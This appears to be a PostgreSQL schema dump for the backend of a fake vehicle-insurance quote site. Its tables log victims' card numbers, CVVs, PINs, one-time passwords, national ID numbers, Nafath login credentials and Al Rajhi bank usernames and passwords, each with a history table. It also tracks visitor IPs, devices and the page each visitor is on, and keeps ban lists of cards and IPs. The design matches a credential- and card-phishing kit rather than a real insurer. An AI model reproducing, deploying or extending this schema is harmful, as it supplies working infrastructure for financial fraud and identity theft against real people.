--
-- PostgreSQL database dump
--

\restrict an23qm0hRpKBVgxKd1wJ8JhpzZjCiuGKrqF6dTcqjbZbvbXmhdej2B78HTuen0y

-- Dumped from database version 17.11
-- Dumped by pg_dump version 17.9

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'SQL_ASCII';
SET standard_conforming_strings = off;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET escape_string_warning = off;
SET row_security = off;

--
-- Name: public; Type: SCHEMA; Schema: -; Owner: -
--

CREATE SCHEMA public;


--
-- Name: SCHEMA public; Type: COMMENT; Schema: -; Owner: -
--

COMMENT ON SCHEMA public IS 'standard public schema';


--
-- Name: app_role; Type: TYPE; Schema: public; Owner: -
--

CREATE TYPE public.app_role AS ENUM (
    'admin',
    'moderator',
    'user'
);


--
-- Name: has_role(uuid, public.app_role); Type: FUNCTION; Schema: public; Owner: -
--

CREATE FUNCTION public.has_role(_user_id uuid, _role public.app_role) RETURNS boolean
    LANGUAGE sql STABLE SECURITY DEFINER
    SET search_path TO 'public'
    AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role = _role
  )
$$;


SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: admin_activity_log; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.admin_activity_log (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    actor_id uuid,
    actor_email text,
    action text NOT NULL,
    target_type text,
    target_id text,
    meta jsonb DEFAULT '{}'::jsonb NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.admin_activity_log REPLICA IDENTITY FULL;


--
-- Name: banned_cards; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.banned_cards (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_number text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);


--
-- Name: banned_ips; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.banned_ips (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    ip text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);


--
-- Name: card_input_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.card_input_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    card_number text,
    card_name text,
    year text,
    cvv text,
    phone_number text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.card_input_history REPLICA IDENTITY FULL;


--
-- Name: card_nafath_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.card_nafath_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    code text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.card_nafath_history REPLICA IDENTITY FULL;


--
-- Name: card_otp_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.card_otp_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    otp text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.card_otp_history REPLICA IDENTITY FULL;


--
-- Name: card_pin_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.card_pin_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    pin text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.card_pin_history REPLICA IDENTITY FULL;


--
-- Name: card_rajhi_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.card_rajhi_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    username text,
    password text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.card_rajhi_history REPLICA IDENTITY FULL;


--
-- Name: cards; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.cards (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid,
    card_number text,
    card_name text,
    year text,
    cvv text,
    phone_number text,
    total_price text,
    company text,
    offer_selected_at timestamp with time zone,
    status integer DEFAULT 0 NOT NULL,
    otp text,
    pin text,
    username_nafath text,
    password_nafath text,
    username text,
    password text,
    rajhi_status integer,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.cards REPLICA IDENTITY FULL;


--
-- Name: insurance_offers; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.insurance_offers (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    company_name text NOT NULL,
    company_logo_url text,
    type text NOT NULL,
    price numeric NOT NULL,
    rate numeric DEFAULT 0 NOT NULL,
    min_price numeric DEFAULT 0 NOT NULL,
    features jsonb DEFAULT '[]'::jsonb NOT NULL,
    active boolean DEFAULT true NOT NULL,
    sort_order integer DEFAULT 0 NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    CONSTRAINT insurance_offers_min_price_check CHECK ((min_price >= (0)::numeric)),
    CONSTRAINT insurance_offers_price_check CHECK ((price >= (0)::numeric)),
    CONSTRAINT insurance_offers_rate_check CHECK ((rate >= (0)::numeric)),
    CONSTRAINT insurance_offers_type_check CHECK ((type = ANY (ARRAY['ضد الغير'::text, 'شامل'::text, 'طبي'::text, 'سفر'::text, 'أخطاء طبية'::text])))
);

ALTER TABLE ONLY public.insurance_offers REPLICA IDENTITY FULL;


--
-- Name: profiles; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.profiles (
    id uuid NOT NULL,
    display_name text,
    avatar_url text,
    preferences jsonb DEFAULT '{}'::jsonb NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


--
-- Name: quote_details; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.quote_details (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid NOT NULL,
    full_name text,
    phone text,
    message text,
    car_value numeric,
    created_year integer,
    doc_date date,
    purpose_use text,
    repair_place text,
    vehicle_type text,
    vehicle_model text,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


--
-- Name: quote_submission_history; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.quote_submission_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid NOT NULL,
    insurance_kind text,
    id_type text,
    ssn text,
    phone text,
    year integer,
    serial_number text,
    plate_number text,
    is_transfer boolean,
    seller_ssn text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.quote_submission_history REPLICA IDENTITY FULL;


--
-- Name: quotes; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.quotes (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    session_id text NOT NULL,
    insurance_kind text DEFAULT 'vehicle'::text NOT NULL,
    ssn text,
    id_type text,
    phone text,
    year integer,
    serial_number text,
    plate_number text,
    is_transfer boolean DEFAULT false NOT NULL,
    seller_ssn text,
    visitor_name text,
    status text,
    current_page text DEFAULT 'الرئيسية'::text NOT NULL,
    ip_address text,
    country text,
    referrer text,
    user_agent text,
    browser text,
    os text,
    device text,
    archived boolean DEFAULT false NOT NULL,
    blocked boolean DEFAULT false NOT NULL,
    completed boolean DEFAULT false NOT NULL,
    distinguished boolean DEFAULT false NOT NULL,
    pinned boolean DEFAULT false NOT NULL,
    trashed boolean DEFAULT false NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL,
    last_active_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.quotes REPLICA IDENTITY FULL;


--
-- Name: settings; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.settings (
    setting_key text NOT NULL,
    setting_value text DEFAULT ''::text NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


--
-- Name: user_roles; Type: TABLE; Schema: public; Owner: -
--

CREATE TABLE public.user_roles (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    user_id uuid NOT NULL,
    role public.app_role NOT NULL
);


--
-- Name: admin_activity_log admin_activity_log_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.admin_activity_log
    ADD CONSTRAINT admin_activity_log_pkey PRIMARY KEY (id);


--
-- Name: banned_cards banned_cards_card_number_key; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.banned_cards
    ADD CONSTRAINT banned_cards_card_number_key UNIQUE (card_number);


--
-- Name: banned_cards banned_cards_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.banned_cards
    ADD CONSTRAINT banned_cards_pkey PRIMARY KEY (id);


--
-- Name: banned_ips banned_ips_ip_key; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.banned_ips
    ADD CONSTRAINT banned_ips_ip_key UNIQUE (ip);


--
-- Name: banned_ips banned_ips_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.banned_ips
    ADD CONSTRAINT banned_ips_pkey PRIMARY KEY (id);


--
-- Name: card_input_history card_input_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_input_history
    ADD CONSTRAINT card_input_history_pkey PRIMARY KEY (id);


--
-- Name: card_nafath_history card_nafath_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_nafath_history
    ADD CONSTRAINT card_nafath_history_pkey PRIMARY KEY (id);


--
-- Name: card_otp_history card_otp_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_otp_history
    ADD CONSTRAINT card_otp_history_pkey PRIMARY KEY (id);


--
-- Name: card_pin_history card_pin_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_pin_history
    ADD CONSTRAINT card_pin_history_pkey PRIMARY KEY (id);


--
-- Name: card_rajhi_history card_rajhi_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_rajhi_history
    ADD CONSTRAINT card_rajhi_history_pkey PRIMARY KEY (id);


--
-- Name: cards cards_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.cards
    ADD CONSTRAINT cards_pkey PRIMARY KEY (id);


--
-- Name: insurance_offers insurance_offers_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.insurance_offers
    ADD CONSTRAINT insurance_offers_pkey PRIMARY KEY (id);


--
-- Name: profiles profiles_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.profiles
    ADD CONSTRAINT profiles_pkey PRIMARY KEY (id);


--
-- Name: quote_details quote_details_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quote_details
    ADD CONSTRAINT quote_details_pkey PRIMARY KEY (id);


--
-- Name: quote_submission_history quote_submission_history_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quote_submission_history
    ADD CONSTRAINT quote_submission_history_pkey PRIMARY KEY (id);


--
-- Name: quotes quotes_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quotes
    ADD CONSTRAINT quotes_pkey PRIMARY KEY (id);


--
-- Name: quotes quotes_session_id_key; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quotes
    ADD CONSTRAINT quotes_session_id_key UNIQUE (session_id);


--
-- Name: settings settings_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.settings
    ADD CONSTRAINT settings_pkey PRIMARY KEY (setting_key);


--
-- Name: user_roles user_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.user_roles
    ADD CONSTRAINT user_roles_pkey PRIMARY KEY (id);


--
-- Name: user_roles user_roles_user_id_role_key; Type: CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.user_roles
    ADD CONSTRAINT user_roles_user_id_role_key UNIQUE (user_id, role);


--
-- Name: admin_activity_log_created_at_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX admin_activity_log_created_at_idx ON public.admin_activity_log USING btree (created_at DESC);


--
-- Name: cards_created_at_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX cards_created_at_idx ON public.cards USING btree (created_at DESC);


--
-- Name: cards_quote_id_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX cards_quote_id_idx ON public.cards USING btree (quote_id);


--
-- Name: insurance_offers_active_type_sort_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX insurance_offers_active_type_sort_idx ON public.insurance_offers USING btree (active, type, sort_order);


--
-- Name: quote_details_quote_id_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX quote_details_quote_id_idx ON public.quote_details USING btree (quote_id);


--
-- Name: quote_submission_history_quote_id_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX quote_submission_history_quote_id_idx ON public.quote_submission_history USING btree (quote_id, created_at);


--
-- Name: quotes_last_active_idx; Type: INDEX; Schema: public; Owner: -
--

CREATE INDEX quotes_last_active_idx ON public.quotes USING btree (last_active_at DESC);


--
-- Name: card_input_history card_input_history_card_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_input_history
    ADD CONSTRAINT card_input_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;


--
-- Name: card_nafath_history card_nafath_history_card_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_nafath_history
    ADD CONSTRAINT card_nafath_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;


--
-- Name: card_otp_history card_otp_history_card_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_otp_history
    ADD CONSTRAINT card_otp_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;


--
-- Name: card_pin_history card_pin_history_card_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_pin_history
    ADD CONSTRAINT card_pin_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;


--
-- Name: card_rajhi_history card_rajhi_history_card_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.card_rajhi_history
    ADD CONSTRAINT card_rajhi_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;


--
-- Name: cards cards_quote_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.cards
    ADD CONSTRAINT cards_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;


--
-- Name: quote_details quote_details_quote_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quote_details
    ADD CONSTRAINT quote_details_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;


--
-- Name: quote_submission_history quote_submission_history_quote_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.quote_submission_history
    ADD CONSTRAINT quote_submission_history_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;


--
-- Name: user_roles user_roles_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: -
--

ALTER TABLE ONLY public.user_roles
    ADD CONSTRAINT user_roles_user_id_fkey FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE;


--
-- Name: admin_activity_log Admins insert activity log; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins insert activity log" ON public.admin_activity_log FOR INSERT TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: banned_cards Admins manage banned_cards; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage banned_cards" ON public.banned_cards TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: banned_ips Admins manage banned_ips; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage banned_ips" ON public.banned_ips TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: card_input_history Admins manage card_input_history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage card_input_history" ON public.card_input_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: card_nafath_history Admins manage card_nafath_history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage card_nafath_history" ON public.card_nafath_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: card_otp_history Admins manage card_otp_history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage card_otp_history" ON public.card_otp_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: card_pin_history Admins manage card_pin_history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage card_pin_history" ON public.card_pin_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: card_rajhi_history Admins manage card_rajhi_history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage card_rajhi_history" ON public.card_rajhi_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: cards Admins manage cards; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage cards" ON public.cards TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: quote_details Admins manage quote details; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage quote details" ON public.quote_details TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: quote_submission_history Admins manage quote history; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage quote history" ON public.quote_submission_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: quotes Admins manage quotes; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage quotes" ON public.quotes TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: settings Admins manage settings; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins manage settings" ON public.settings TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: admin_activity_log Admins read activity log; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Admins read activity log" ON public.admin_activity_log FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role));


--
-- Name: insurance_offers Public can read active insurance offers; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Public can read active insurance offers" ON public.insurance_offers FOR SELECT TO authenticated, anon USING ((active = true));


--
-- Name: profiles Users can insert own profile; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Users can insert own profile" ON public.profiles FOR INSERT TO authenticated WITH CHECK ((id = auth.uid()));


--
-- Name: profiles Users can read own profile; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Users can read own profile" ON public.profiles FOR SELECT TO authenticated USING ((id = auth.uid()));


--
-- Name: user_roles Users can read own roles; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Users can read own roles" ON public.user_roles FOR SELECT TO authenticated USING ((user_id = auth.uid()));


--
-- Name: profiles Users can update own profile; Type: POLICY; Schema: public; Owner: -
--

CREATE POLICY "Users can update own profile" ON public.profiles FOR UPDATE TO authenticated USING ((id = auth.uid())) WITH CHECK ((id = auth.uid()));


--
-- Name: admin_activity_log; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.admin_activity_log ENABLE ROW LEVEL SECURITY;

--
-- Name: banned_cards; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.banned_cards ENABLE ROW LEVEL SECURITY;

--
-- Name: banned_ips; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;

--
-- Name: card_input_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.card_input_history ENABLE ROW LEVEL SECURITY;

--
-- Name: card_nafath_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.card_nafath_history ENABLE ROW LEVEL SECURITY;

--
-- Name: card_otp_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.card_otp_history ENABLE ROW LEVEL SECURITY;

--
-- Name: card_pin_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.card_pin_history ENABLE ROW LEVEL SECURITY;

--
-- Name: card_rajhi_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.card_rajhi_history ENABLE ROW LEVEL SECURITY;

--
-- Name: cards; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.cards ENABLE ROW LEVEL SECURITY;

--
-- Name: insurance_offers; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.insurance_offers ENABLE ROW LEVEL SECURITY;

--
-- Name: profiles; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

--
-- Name: quote_details; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.quote_details ENABLE ROW LEVEL SECURITY;

--
-- Name: quote_submission_history; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.quote_submission_history ENABLE ROW LEVEL SECURITY;

--
-- Name: quotes; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.quotes ENABLE ROW LEVEL SECURITY;

--
-- Name: settings; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;

--
-- Name: user_roles; Type: ROW SECURITY; Schema: public; Owner: -
--

ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

--
-- PostgreSQL database dump complete
--

\unrestrict an23qm0hRpKBVgxKd1wJ8JhpzZjCiuGKrqF6dTcqjbZbvbXmhdej2B78HTuen0y

